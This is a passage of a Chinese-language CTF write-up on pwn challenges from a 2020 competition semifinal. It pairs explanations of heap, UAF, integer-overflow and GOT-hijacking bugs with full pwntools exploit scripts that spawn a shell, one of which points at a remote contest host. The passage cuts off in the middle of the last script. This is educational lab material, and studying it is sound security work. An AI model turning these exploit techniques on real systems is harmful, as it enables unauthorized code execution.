punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload3<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pwn2"><a href="#pwn2" class="headerlink" title="pwn2"></a>pwn2</h2><h3 id="简单分析"><a href="#简单分析" class="headerlink" title="简单分析"></a>简单分析</h3><p>这道题四个功能：new、edit、show、delete。输入内容有字符限制</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/0.png"></div><p>漏洞存在于delete时候没有清空造成double free/UAF</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/1.png"></div><p>思路是利用io file攻击，因为我们看到字符限制的地方是在读入字符串之后，那么意思是在exit之前我们有一次写限制字符的机会。之前调的时候采取改_io_2_1_stdout处，没能成功，学习征哥的博客后知道了思路应该是这样：<strong>改_IO_list_all其值为_IO_list_all+8，而后布置fake_io，io的关键check是_flags &amp; 1 != 0以及 _IO_USER_BUF != 0，构造的话,fp+0xe8为system函数地址，fp+0x38为binsh字符串地址，fp+0xd8 = _IO_str_jumps-8。</strong></p><p>另外stdout不能改，否则puts会出问题，stderr不能改，因为其fp+0xe8对应到stdout-&gt;read_ptr，在puts的时候会被更新，stdin也无法改，因为两个字节改不到</p><p>我们详细看看是怎么回事：实际上也是绕过上面的判断：mode&lt;=0，io_write_ptr&gt;io_write_base</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/2.png"></div>这时候会调用vtable处str_jump+0x18，之前是io_overflow但现在我们已经将vtable改为str_jump-0x8的位置，所以它执行的虚函数就不是overflow了，继续看下面：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/3.png"></div>我们看到这里有个函数调用，实际上就是以fd+0x38为rdi，call fd+0xe8处的函数地址。<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>debug <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>se      <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sa      <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data     <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sl      <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>data<span class="token punctuation">)</span>sla     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data     <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>sea     <span class="token operator">=</span> <span class="token keyword">lambda</span> delim<span class="token punctuation">,</span>data     <span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>delim<span class="token punctuation">,</span> data<span class="token punctuation">)</span>rc      <span class="token operator">=</span> <span class="token keyword">lambda</span> numb<span class="token operator">=</span><span class="token number">4096</span>      <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token punctuation">)</span>rl      <span class="token operator">=</span> <span class="token keyword">lambda</span>                <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru      <span class="token operator">=</span> <span class="token keyword">lambda</span> delims         <span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>delims<span class="token punctuation">)</span>uu32    <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>uu64    <span class="token operator">=</span> <span class="token keyword">lambda</span> data           <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>itv     <span class="token operator">=</span> <span class="token keyword">lambda</span>                <span class="token punctuation">:</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 0x4f2c5 execve("/bin/sh", rsp+0x40, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   rcx == NULL</span><span class="token comment" spellcheck="true"># 0x4f322 execve("/bin/sh", rsp+0x40, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x40] == NULL</span><span class="token comment" spellcheck="true"># 0x10a38c execve("/bin/sh", rsp+0x70, environ)</span><span class="token comment" spellcheck="true"># constraints:</span><span class="token comment" spellcheck="true">#   [rsp+0x70] == NULL</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./sentencebox"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># p = process('./feedback',env={'LD_PRELOAD':'./libc-2.23.so'})</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./sentencebox"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"124.70.197.50"</span><span class="token punctuation">,</span><span class="token number">9010</span><span class="token punctuation">)</span>    elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./sentencebox"</span><span class="token punctuation">)</span>    libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc-2.27.so"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>size<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"idx: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"size: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"data: \n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"2"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"idx: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    sa<span class="token punctuation">(</span><span class="token string">"data: \n"</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"3"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"idx: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    sla<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">,</span><span class="token string">"4"</span><span class="token punctuation">)</span>    sla<span class="token punctuation">(</span><span class="token string">"idx: \n"</span><span class="token punctuation">,</span>str<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    create<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    delete<span class="token punctuation">(</span>i<span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">0x7ffff79e4000</span><span class="token operator">-</span><span class="token number">0x7ffff7dcfca0</span>success<span class="token punctuation">(</span><span class="token string">"libc ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>io_list_all <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"_IO_list_all"</span><span class="token punctuation">]</span>libc_base <span class="token operator">=</span> <span class="token number">0x7ffff79e4000</span><span class="token keyword">if</span> io_list_all<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token operator">!=</span> <span class="token number">0x6660</span><span class="token punctuation">:</span>    success<span class="token punctuation">(</span><span class="token string">"io_list_all ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>io_list_all<span class="token operator">&amp;</span><span class="token number">0xffff</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">"\x5a\x66"</span><span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span><span class="token string">"a"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">"\x00"</span><span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"_IO_list_all"</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7dd07e3</span><span class="token operator">-</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7dd07e4</span><span class="token operator">-</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7dd07e3</span><span class="token operator">-</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh\x00"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7dd07e4</span><span class="token operator">-</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7dcfa00</span><span class="token operator">-</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000000001</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x000000000a000000</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7dd18c0</span><span class="token operator">-</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0xffffffffffffffff</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7dcf8c0</span><span class="token operator">-</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x0000000000000000</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">6</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x7f51eb8a2360</span><span class="token operator">-</span><span class="token number">0x7f51eb4ba000</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token number">-8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x00007ffff7dd0680</span><span class="token operator">-</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>create<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">0xff</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># write stdout ,open /proc/sys/kernel/randomize_va_space</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="半决赛day2"><a href="#半决赛day2" class="headerlink" title="半决赛day2"></a>半决赛day2</h1><h2 id="pwn1-1"><a href="#pwn1-1" class="headerlink" title="pwn1"></a>pwn1</h2><h3 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h3><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/4.png"></div>GOT可劫持，PIE没开。2.27 题目考点：整数溢出、sscanf函数功能，劫持got表### IDA分析这道题是模拟计算机的题目，题目流程大致是先输入size，然后输入算式，计算后输出结果：<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/5.png"></div>漏洞存在于size输入0的时候会导致无限溢出。<p>比赛的时候wz师傅找到这个洞了，发现可以溢出，唯一不知道如何去利用这个漏洞leak libc地址。注意sscanf函数：</p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/6.png"></div>从v27以%d的格式读到new_heap_100_602160位置，第一个参数是开始就从算式读取的数字，最后一个地址内容可以通过溢出来修改，那么这两个参数都可控，就可以劫持got表了。<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>大致是劫持free为printf，在对应的地方伪造格式化字符串打印libc<br>然后再劫持一次atoi，注意由于数字长度限制，所以我们劫持atoi got表的时候只需要改后面4个字节.</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'split'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>context<span class="token punctuation">.</span>update<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./calculator"</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./calculator"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size:\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"formula:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> str<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'printf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x30</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> <span class="token string">"aaa-%7$p"</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x602150</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0x"</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address <span class="token operator">=</span> int<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x7ffff7dd0760</span><span class="token operator">+</span><span class="token number">0x7ffff79e4000</span>success<span class="token punctuation">(</span><span class="token string">"libc addr ==> "</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size:\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>str<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"formula:\n"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> str<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token operator">-</span><span class="token number">0xa0</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"\x00"</span>payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x38</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span>payload<span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'atoi'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"size:\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="pwn2-1"><a href="#pwn2-1" class="headerlink" title="pwn2"></a>pwn2</h2><h3 id="查看文件-1"><a href="#查看文件-1" class="headerlink" title="查看文件"></a>查看文件</h3><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/7.png"></div>stack没开，2.32的一道题目### IDA三个功能：createSmallChunk、createLargeChunk、BuildSomething<div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/8.png"></div>下面分别介绍三个功能<p><strong>createSmallChunk：</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/9.png"></div><p><strong>createLargeChunk：</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/10.png"></div>我们看到这个功能分配chunk是通过mmap来分配的，成功则进行信息的填充，如果失败则返回。<p><strong>buildSomething：</strong></p><div style="width:70%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/09/25/2020-guo-sai-ban-jue-sai-pwn-ti-ji-lu/11.png"></div>这个功能要求输入random num，和其准备的随机数进行比较，但是由于其随机数种子右移三位，所以就可以预测了，我们可以写个程序进行预测这个数据，后面则是带着堆溢出漏洞了。<h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>2.32 fd会进行safe linking，需要和堆地址的&lt;&lt;12异或，所以我们需要得到堆地址。</p><p>hijacking hook需要得到libc地址，这下该怎么办呢，wz师傅想到了非常巧妙地方法，mmap结果+size的二分法来找到libc地址和heap地址。当某个地址已分配那么就会失败，通过这个方法找到libc和heap地址。</p><p>还有一点是溢出的地方会进行随机数的一个比较，但是随机数种子右移三位，那么其实就是可以预测了，写一个可执行文件，编译后利用python的commands模块来进行获取随机数，来进行溢出。</p><p>最后有libc地址和heap地址了，又可以溢出了，那么利用house of orange即可。</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">import</span> commandsr <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>rl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>ru <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rn <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span>x<span class="token punctuation">)</span>rud <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>x<span class="token punctuation">,</span>drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sl <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>x<span class="token punctuation">)</span>sla <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>sa <span class="token operator">=</span> <span class="token keyword">lambda</span> p<span class="token punctuation">,</span>x<span class="token punctuation">,</span>y<span class="token punctuation">:</span>p<span class="token 